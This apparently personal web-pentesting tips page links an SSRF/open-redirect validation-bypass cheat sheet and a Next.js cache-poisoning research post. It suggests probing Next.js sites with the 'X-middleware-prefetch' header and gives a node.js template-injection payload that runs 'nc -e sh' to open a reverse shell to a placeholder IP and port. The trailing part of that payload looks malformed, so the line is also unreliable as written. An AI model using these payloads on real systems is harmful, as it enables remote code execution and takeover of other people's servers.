# Tips

### URL Validation bypass (openredirect, SSRF, vv)

```
https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
```

### Find nextjs page try Add Header

```
X-middleware-prefetch: 1
```

Maybe have CVE-2023-46298 if save cache

{% embed url="https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole" %}

### RCE node js teamplate

If you discover a node.js template area, you should try triggerable node payload `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
